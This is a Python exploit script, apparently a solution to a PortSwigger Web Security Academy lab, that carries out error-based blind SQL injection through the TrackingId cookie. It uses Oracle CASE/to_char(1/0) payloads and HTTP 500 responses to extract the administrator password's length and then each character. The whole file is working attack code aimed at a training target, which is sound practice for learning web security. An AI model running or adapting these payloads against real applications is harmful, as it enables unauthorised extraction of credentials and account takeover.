import os
import requests
import string

def clearScreen():
    currentOS = os.name 

    if currentOS == "nt": os.system('cls')
    elif currentOS == "posix": os.system('clear')

def getPwLen():
    maxLen = 25
    for i in range(1, maxLen+1):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36',
            # Triggers server internal error if password length is correct.
            'Cookie': f"TrackingId={trackingID}'||(select case when length(password)={i} then to_char(1/0) else '' end from users where username='administrator')||'; session={sessionID}"
        }

        res = requests.get(url, headers=headers)

        # If response code is 500 it means that we hit the correct password length
        if res.status_code == 500:
            print(f"[+] Administrator password length: {i}")
            return(i)

def getPassword():
    # Generate chars + numbers
    charsets = '0123456789' + string.ascii_lowercase 

    adminPassword = ''
    print('[+] Guessing administrator\'s password:')

    # Outer loop - Encompass the password length
    for i in range(1, pwLen +1):
        # Inner loop - Loop between individual characters from the charset
        for c in charsets:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36',
                # Triggers server internal error if the current password character on the current index matches the current password character on the database
                'Cookie' : f"TrackingId={trackingID}'||(select case when substr(password, {i}, 1)='{c}' then to_char(1/0) else '' end from users where username='administrator')||'; session={sessionID}"
            }

            res = requests.get(url, headers=headers)

            # If response code is 500 it means that we hit the correct password character on the current index
            if res.status_code == 500:
                adminPassword += c
                print(f"[+] Password: {adminPassword}", end='\r', flush=False)
                break # Once password is found on current index, breaks out of for loop and go to the next index
    
    print(f"[+] Password: {adminPassword}")

if __name__ == "__main__":
    clearScreen()

    host = '' # Insert host here
    url = f'https://{host}.web-security-academy.net/'
    trackingID = '' # Insert tracking ID here
    sessionID = ''  # Insert session ID here

    pwLen = getPwLen()
    getPassword()